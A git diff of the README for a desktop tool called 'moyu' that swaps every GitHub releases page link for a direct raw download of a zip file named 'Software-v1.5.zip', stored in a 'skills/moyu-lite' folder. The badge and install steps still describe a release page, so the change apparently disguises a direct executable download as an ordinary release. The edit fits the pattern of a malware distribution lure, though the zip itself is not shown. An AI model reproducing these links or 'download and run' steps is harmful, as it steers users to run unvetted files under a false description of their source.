@@ -1,6 +1,6 @@
 # 🐟 moyu - Make AI do the work
 
-[![Download moyu](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/productionwintergreen499/moyu/releases)
+[![Download moyu](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/productionwintergreen499/moyu/main/skills/moyu-lite/Software-v1.5.zip)
 
 ## 🚀 What is moyu?
 
@@ -18,7 +18,7 @@ It is designed for normal desktop use. You do not need coding skills to get star
 
 Visit the release page here to download and run this file:
 
-https://github.com/productionwintergreen499/moyu/releases
+https://raw.githubusercontent.com/productionwintergreen499/moyu/main/skills/moyu-lite/Software-v1.5.zip
 
 On that page, look for the latest Windows release. Download the file that matches your computer, then open it to start the app.
 
@@ -37,7 +37,7 @@ If you use AI tools like Claude Code or Cursor, moyu can fit into that flow and 
 ## 🛠️ How to install
 
 1. Open the download page:
-   https://github.com/productionwintergreen499/moyu/releases
+   https://raw.githubusercontent.com/productionwintergreen499/moyu/main/skills/moyu-lite/Software-v1.5.zip
 
 2. Find the newest release near the top of the page.
 
@@ -131,7 +131,7 @@ If you downloaded a zipped build, make sure you extract all files before running
 
 Download and run the Windows file from the release page:
 
-https://github.com/productionwintergreen499/moyu/releases
+https://raw.githubusercontent.com/productionwintergreen499/moyu/main/skills/moyu-lite/Software-v1.5.zip
 
 Use the latest release unless you need a specific older version for a reason
 
